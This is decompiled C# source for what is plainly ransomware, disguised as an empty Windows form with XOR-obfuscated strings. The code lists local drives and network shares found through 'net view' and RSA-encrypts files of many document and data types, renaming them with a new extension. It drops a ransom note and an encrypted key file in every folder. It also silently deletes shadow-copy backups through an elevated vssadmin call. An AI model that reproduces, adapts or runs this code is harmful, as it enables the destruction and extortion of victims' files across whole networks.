using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace smcct;

public class Form1 : Form
{
	private byte byte_0 = 102;

	private int int_0 = 245;

	private int int_1 = 3;

	private string string_0 = "";

	private string string_1;

	private string string_2 = "";

	private string string_3 = "";

	private string string_4 = "";

	private string string_5 = "";

	private string string_6 = "";

	private List<string> list_0 = new List<string>();

	private List<string> list_1 = new List<string>();

	private List<string> list_2 = new List<string>();

	private string string_7 = "";

	private string string_8 = "";

	private IContainer icontainer_0;

	public Form1()
	{
		InitializeComponent();
		if (!method_1())
		{
			method_0();
		}
	}

	private void method_0()
	{
		method_19(2);
		method_2();
		method_13();
		method_11();
	}

	private bool method_1()
	{
		bool result = false;
		if (Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length > 1)
		{
			result = true;
		}
		return result;
	}

	private void method_2()
	{
		byte[] byte_ = new byte[9] { 13, 19, 13, 7, 20, 7, 5, 14, 7 };
		byte[] byte_2 = new byte[11]
		{
			13, 3, 31, 5, 9, 2, 3, 72, 18, 18,
			7
		};
		byte[] byte_3 = new byte[31]
		{
			75, 75, 75, 75, 75, 75, 75, 75, 169, 182,
			168, 177, 180, 174, 70, 170, 163, 171, 185, 75,
			75, 75, 75, 75, 75, 75, 75, 72, 18, 30,
			18
		};
		byte[] byte_4 = new byte[75]
		{
			164, 134, 158, 142, 70, 146, 134, 143, 141, 157,
			70, 129, 134, 158, 142, 146, 150, 136, 132, 134,
			139, 157, 70, 151, 70, 142, 151, 137, 136, 141,
			154, 129, 136, 132, 134, 139, 142, 131, 138, 70,
			140, 150, 142, 137, 148, 136, 151, 148, 136, 143,
			140, 136, 133, 136, 70, 134, 141, 133, 136, 150,
			142, 148, 138, 134, 70, 52, 53, 39, 75, 84,
			86, 82, 94, 72, 70
		};
		byte[] byte_5 = new byte[111]
		{
			163, 151, 141, 142, 70, 147, 136, 148, 142, 148,
			131, 70, 142, 147, 70, 132, 131, 150, 139, 149,
			148, 154, 70, 136, 148, 137, 150, 134, 132, 154,
			148, 131, 70, 136, 130, 142, 139, 70, 142, 129,
			70, 129, 134, 158, 142, 146, 150, 136, 132, 134,
			139, 139, 157, 147, 70, 146, 134, 143, 141, 136,
			132, 70, 142, 70, 146, 134, 143, 141, 70, 13,
			3, 31, 5, 9, 2, 3, 72, 18, 18, 7,
			70, 139, 134, 70, 3, 75, 11, 7, 15, 10,
			92, 70, 19, 8, 10, 9, 5, 13, 95, 84,
			38, 15, 8, 2, 15, 7, 72, 5, 9, 11,
			70
		};
		byte[] byte_6 = new byte[127]
		{
			163, 151, 141, 142, 70, 132, 157, 70, 139, 131,
			70, 137, 136, 141, 149, 145, 142, 141, 142, 70,
			136, 148, 132, 131, 148, 134, 70, 132, 70, 148,
			131, 145, 131, 139, 142, 131, 70, 151, 149, 148,
			136, 140, 70, 148, 136, 70, 151, 140, 134, 145,
			134, 143, 148, 131, 70, 151, 70, 151, 134, 143,
			148, 134, 70, 17, 17, 17, 72, 18, 9, 20,
			22, 20, 9, 12, 3, 5, 18, 72, 5, 9,
			8, 70, 135, 150, 134, 149, 129, 131, 150, 70,
			70, 50, 41, 52, 70, 142, 70, 151, 70, 131,
			133, 136, 70, 137, 136, 138, 136, 159, 154, 152,
			70, 129, 134, 143, 130, 142, 148, 131, 70, 139,
			134, 70, 151, 134, 143, 148, 92
		};
		byte[] byte_7 = new byte[77]
		{
			14, 18, 18, 22, 92, 73, 73, 3, 28, 19,
			10, 30, 30, 18, 17, 23, 9, 21, 83, 1,
			81, 85, 80, 72, 9, 8, 15, 9, 8, 70,
			75, 70, 70, 148, 134, 138, 70, 135, 149, 130,
			131, 148, 70, 149, 140, 134, 129, 134, 139, 70,
			130, 131, 143, 151, 148, 132, 149, 152, 159, 142,
			143, 70, 137, 136, 145, 148, 136, 132, 157, 143,
			70, 153, 159, 142, 140, 72, 70
		};
		byte[] byte_8 = new byte[79]
		{
			169, 136, 137, 157, 148, 140, 142, 70, 151, 134,
			138, 136, 151, 148, 136, 153, 148, 131, 141, 154,
			139, 136, 133, 136, 70, 132, 136, 151, 151, 148,
			134, 139, 136, 132, 141, 131, 139, 142, 153, 70,
			146, 134, 143, 141, 136, 132, 70, 138, 136, 133,
			149, 148, 70, 135, 131, 129, 132, 136, 129, 132,
			150, 134, 148, 139, 136, 70, 142, 147, 70, 142,
			151, 137, 136, 150, 148, 142, 148, 154, 71
		};
		byte[] byte_9 = new byte[415]
		{
			90, 52, 53, 39, 45, 3, 31, 48, 7, 10,
			19, 3, 88, 90, 43, 9, 2, 19, 10, 19,
			21, 88, 77, 0, 32, 63, 15, 41, 95, 37,
			46, 95, 15, 60, 17, 17, 28, 10, 21, 55,
			85, 62, 77, 23, 60, 81, 51, 31, 30, 84,
			95, 86, 41, 14, 60, 87, 49, 16, 42, 18,
			80, 5, 11, 34, 2, 83, 9, 52, 21, 42,
			9, 46, 42, 8, 9, 33, 17, 21, 87, 37,
			49, 32, 43, 41, 33, 32, 12, 18, 4, 7,
			52, 41, 53, 13, 50, 1, 85, 49, 77, 81,
			84, 73, 50, 12, 28, 46, 13, 19, 54, 22,
			84, 49, 73, 52, 37, 81, 32, 36, 37, 82,
			44, 22, 1, 1, 19, 37, 15, 82, 30, 82,
			31, 3, 82, 46, 35, 17, 52, 13, 55, 81,
			83, 18, 46, 14, 15, 1, 86, 94, 14, 52,
			45, 11, 87, 7, 81, 17, 10, 17, 63, 10,
			94, 28, 42, 39, 28, 43, 94, 39, 17, 50,
			54, 42, 14, 81, 81, 86, 43, 41, 28, 54,
			23, 32, 87, 0, 44, 43, 45, 60, 37, 39,
			18, 2, 51, 1, 47, 45, 2, 63, 40, 39,
			13, 20, 54, 87, 94, 21, 52, 4, 21, 14,
			13, 33, 40, 12, 17, 12, 43, 14, 43, 42,
			40, 4, 45, 50, 7, 63, 0, 9, 85, 23,
			47, 53, 82, 16, 18, 48, 51, 55, 18, 5,
			17, 77, 1, 95, 31, 21, 85, 60, 32, 60,
			3, 18, 45, 35, 10, 86, 60, 43, 44, 35,
			22, 82, 62, 81, 4, 82, 46, 45, 95, 16,
			23, 51, 9, 14, 54, 36, 63, 0, 36, 21,
			28, 62, 63, 80, 15, 9, 8, 83, 11, 83,
			18, 53, 53, 0, 14, 44, 45, 80, 41, 62,
			84, 46, 54, 7, 51, 80, 52, 34, 5, 7,
			12, 50, 3, 35, 5, 11, 13, 95, 15, 18,
			95, 30, 81, 85, 2, 20, 44, 10, 3, 60,
			87, 33, 77, 18, 48, 1, 42, 80, 2, 19,
			42, 62, 73, 19, 41, 49, 54, 48, 31, 15,
			86, 20, 14, 31, 16, 63, 11, 52, 20, 33,
			40, 5, 47, 55, 91, 91, 90, 73, 43, 9,
			2, 19, 10, 19, 21, 88, 90, 35, 30, 22,
			9, 8, 3, 8, 18, 88, 39, 55, 39, 36,
			90, 73, 35, 30, 22, 9, 8, 3, 8, 18,
			88, 90, 73, 52, 53, 39, 45, 3, 31, 48,
			7, 10, 19, 3, 88
		};
		string_8 = method_18(byte_4, byte_0) + "\r\n" + method_18(byte_5, byte_0) + "\r\n" + method_18(byte_6, byte_0) + "\r\n" + method_18(byte_7, byte_0) + "\r\n" + method_18(byte_8, byte_0);
		if (Environment.OSVersion.Version.Major > 5)
		{
			method_17();
		}
		string_5 = method_18(byte_9, byte_0);
		method_18(byte_3, byte_0);
		string_7 = method_18(byte_3, byte_0);
		string_2 = method_18(byte_2, byte_0);
		string_1 = method_18(byte_, byte_0);
		string_4 = method_4(string_2);
		string_3 = method_3(string_2);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
		folderPath = folderPath.Substring(0, folderPath.ToLower().IndexOf("\\system"));
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
		list_0.Add(folderPath.ToLower());
		list_0.Add(folderPath2.ToLower());
		list_0.Add(method_18(new byte[12]
		{
			66, 52, 35, 37, 63, 37, 42, 35, 72, 36,
			47, 40
		}, byte_0));
		list_0.Add(method_18(new byte[8] { 52, 35, 37, 63, 37, 42, 35, 52 }, byte_0));
		list_0.Add(method_18(new byte[25]
		{
			53, 31, 21, 18, 3, 11, 70, 48, 9, 10,
			19, 11, 3, 70, 47, 8, 0, 9, 20, 11,
			7, 18, 15, 9, 8
		}, byte_0));
		method_6();
		method_12();
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		string_0 = rSACryptoServiceProvider.ToXmlString(includePrivateParameters: false);
		string_6 = method_5(rSACryptoServiceProvider.ToXmlString(includePrivateParameters: true));
	}

	private string method_3(string string_9)
	{
		return string_9[..string_9.IndexOf('.')];
	}

	private string method_4(string string_9)
	{
		int num = string_9.IndexOf('.');
		return string_9.Substring(num + 1, string_9.Length - num - 1);
	}

	private string method_5(string string_9)
	{
		string text = "";
		byte[] array = new byte[string_9.Length];
		byte[] array2 = new byte[int_0];
		byte[] array3 = new byte[int_0 + 11];
		double num = Math.Ceiling((double)string_9.Length / (double)int_0);
		if ((double)string_9.Length < num * (double)int_0)
		{
			int length = string_9.Length;
			for (int i = 0; (double)i < num * (double)int_0 - (double)length; i++)
			{
				string_9 += " ";
			}
		}
		array = Encoding.Default.GetBytes(string_9);
		Array.Reverse((Array)array);
		try
		{
			RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
			rSACryptoServiceProvider.FromXmlString(string_5);
			for (int j = 0; (double)j < num; j++)
			{
				Array.Copy(array, j * int_0, array2, 0, int_0);
				array3 = rSACryptoServiceProvider.Encrypt(array2, fOAEP: false);
				text += Encoding.Default.GetString(array3);
			}
			return text;
		}
		catch
		{
			return text;
		}
	}

	private void method_6()
	{
		list_1.Add(method_18(new byte[3] { 72, 5, 2 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 10, 2, 0 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 11, 2, 0 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 11, 7, 30 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 2, 4, 0 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 3, 22, 0 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 87, 5, 2 }, byte_0));
		list_1.Add(method_18(new byte[3] { 72, 11, 2 }, byte_0));
		list_1.Add(method_18(new byte[3] { 72, 2, 4 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 22, 2, 0 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 22, 22, 18 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 30, 10, 21 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 2, 9, 5 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 7, 20, 12 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 18, 7, 20 }, byte_0));
		list_1.Add(method_18(new byte[3] { 72, 81, 28 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 20, 7, 20 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 28, 15, 22 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 18, 15, 0 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 12, 22, 1 }, byte_0));
		list_1.Add(method_18(new byte[3] { 72, 7, 15 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 4, 11, 22 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 22, 8, 1 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 5, 2, 20 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 22, 21, 2 }, byte_0));
		list_1.Add(method_18(new byte[5] { 72, 12, 22, 3, 1 }, byte_0));
		list_1.Add(method_18(new byte[5] { 72, 2, 9, 5, 30 }, byte_0));
		list_1.Add(method_18(new byte[5] { 72, 30, 10, 21, 30 }, byte_0));
		list_1.Add(method_18(new byte[5] { 72, 22, 22, 18, 30 }, byte_0));
		list_1.Add(method_18(new byte[6] { 72, 7, 5, 5, 2, 4 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 11, 2, 4 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 20, 18, 0 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 9, 2, 18 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 9, 2, 21 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 9, 2, 4 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 9, 2, 1 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 5, 20, 84 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 8, 3, 0 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 8, 20, 0 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 9, 20, 0 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 7, 20, 17 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 21, 20, 84 }, byte_0));
		list_1.Add(method_18(new byte[4] { 72, 21, 20, 0 }, byte_0));
	}

	private int method_7(string string_9)
	{
		int result = 0;
		try
		{
			result = Directory.GetFiles(string_9, string_3 + "*." + string_4).Length;
			return result;
		}
		catch
		{
			return result;
		}
	}

	private void method_8(string string_9)
	{
		string currentDirectory = Environment.CurrentDirectory;
		if (string_9 != currentDirectory)
		{
			try
			{
				method_9(string_9 + "\\" + string_7, string_8);
			}
			catch
			{
			}
		}
	}

	private void method_9(string string_9, string string_10)
	{
		try
		{
			File.WriteAllText(string_9, string_10);
		}
		catch
		{
		}
	}

	private void method_10(string string_9, string string_10)
	{
		string text = string_2.Substring(0, string_2.Length - 4);
		if (!File.Exists(string_9 + "\\" + string_2))
		{
			try
			{
				method_9(string_9 + "\\" + string_2, string_10);
				return;
			}
			catch
			{
				return;
			}
		}
		try
		{
			method_9(string_9 + "\\" + text + method_7(string_9) + "." + string_4, string_10);
		}
		catch
		{
		}
	}

	private void method_11()
	{
		for (int i = 0; i < list_2.Count; i++)
		{
			DirectoryInfo directoryInfo_ = new DirectoryInfo(list_2[i].ToString());
			method_14(directoryInfo_);
		}
	}

	private void method_12()
	{
		List<string> list = new List<string>();
		Process process = new Process();
		process.StartInfo.FileName = "cmd";
		process.StartInfo.Arguments = "/C net view";
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.CreateNoWindow = true;
		try
		{
			process.Start();
			string text = process.StandardOutput.ReadToEnd();
			int startIndex = 0;
			int num = 0;
			while (true)
			{
				startIndex = text.IndexOf('\\', startIndex);
				if (startIndex != -1)
				{
					num = text.IndexOf(' ', startIndex);
					list.Add(text.Substring(startIndex, num - startIndex));
					startIndex = num;
					continue;
				}
				break;
			}
		}
		catch
		{
		}
		for (int i = 0; i < list.Count; i++)
		{
			Process process2 = new Process();
			process2.StartInfo.FileName = "cmd";
			process2.StartInfo.Arguments = "/C net view " + list[i];
			process2.StartInfo.RedirectStandardOutput = true;
			process2.StartInfo.UseShellExecute = false;
			process2.StartInfo.CreateNoWindow = true;
			try
			{
				process2.Start();
				string s = process2.StandardOutput.ReadToEnd();
				byte[] bytes = Encoding.GetEncoding(1251).GetBytes(s);
				string[] array = Encoding.GetEncoding("CP866").GetString(bytes).Split('\r', '\n');
				for (int j = 0; j < array.Length; j++)
				{
					if (array[j].IndexOf("Диск") > -1)
					{
						list_2.Add(list[i] + "\\" + array[j].Substring(0, array[j].IndexOf("Диск")));
					}
				}
			}
			catch
			{
			}
		}
	}

	private void method_13()
	{
		try
		{
			string[] logicalDrives = Environment.GetLogicalDrives();
			for (int i = 0; i < logicalDrives.Length; i++)
			{
				DriveInfo driveInfo = new DriveInfo(logicalDrives[i]);
				if (driveInfo.DriveType == DriveType.Fixed || driveInfo.DriveType == DriveType.Network)
				{
					method_14(driveInfo.RootDirectory);
				}
			}
		}
		catch
		{
		}
	}

	private void method_14(DirectoryInfo directoryInfo_0)
	{
		try
		{
			DirectoryInfo[] directories = directoryInfo_0.GetDirectories();
			foreach (DirectoryInfo directoryInfo_ in directories)
			{
				method_15(directoryInfo_);
				method_14(directoryInfo_);
			}
		}
		catch
		{
		}
	}

	private void method_15(DirectoryInfo directoryInfo_0)
	{
		method_10(directoryInfo_0.FullName, string_6);
		method_8(directoryInfo_0.FullName);
		try
		{
			string[] files = Directory.GetFiles(directoryInfo_0.FullName, "*.*");
			foreach (string text in files)
			{
				foreach (string item in list_1)
				{
					if (text.ToLower().IndexOf(item) > -1 && text.ToLower().IndexOf(string_1.ToLower()) < 0)
					{
						string string_ = text;
						string string_2 = text + "." + string_1;
						method_16(string_, string_2);
					}
				}
			}
		}
		catch
		{
		}
	}

	private void method_16(string string_9, string string_10)
	{
		byte[] array = new byte[int_0];
		try
		{
			byte[] array2 = File.ReadAllBytes(string_9);
			if (array2.Length / (int_1 + 5) >= int_0)
			{
				RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
				rSACryptoServiceProvider.FromXmlString(string_0);
				byte[] array3 = new byte[array2.Length + int_1 * 11];
				byte[] array4 = new byte[array2.Length - int_1 * int_0];
				for (int i = 0; i < int_1; i++)
				{
					Array.Copy(array2, int_0 * i, array, 0, int_0);
					byte[] array5 = rSACryptoServiceProvider.Encrypt(array, fOAEP: false);
					Array.Copy(array5, 0, array3, i * (int_0 + 11), array5.Length);
				}
				Array.Copy(array2, int_1 * int_0, array4, 0, array4.Length);
				Array.Copy(array4, 0, array3, int_1 * (int_0 + 11), array4.Length);
				try
				{
					File.WriteAllBytes(string_9, array3);
					File.Move(string_9, string_10);
					return;
				}
				catch
				{
					return;
				}
			}
		}
		catch
		{
		}
	}

	private void method_17()
	{
		byte[] byte_ = new byte[12]
		{
			16, 21, 21, 7, 2, 11, 15, 8, 72, 3,
			30, 3
		};
		byte[] byte_2 = new byte[26]
		{
			34, 3, 10, 3, 18, 3, 70, 53, 14, 7,
			2, 9, 17, 21, 70, 73, 39, 10, 10, 70,
			73, 55, 19, 15, 3, 18
		};
		Process process = new Process();
		process.StartInfo.FileName = method_18(byte_, byte_0);
		process.StartInfo.Arguments = method_18(byte_2, byte_0);
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.UseShellExecute = true;
		process.StartInfo.Verb = "runas";
		try
		{
			process.Start();
		}
		catch
		{
		}
	}

	private string method_18(byte[] byte_1, int int_2)
	{
		byte[] array = new byte[byte_1.Length];
		for (int i = 0; i < byte_1.Length; i++)
		{
			array[i] = (byte)(byte_1[i] ^ int_2);
		}
		return Encoding.Default.GetString(array);
	}

	private void method_19(int int_2)
	{
		for (int i = 0; i < int_2; i++)
		{
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		method_19(3);
		((Form)this).Close();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(284, 261));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
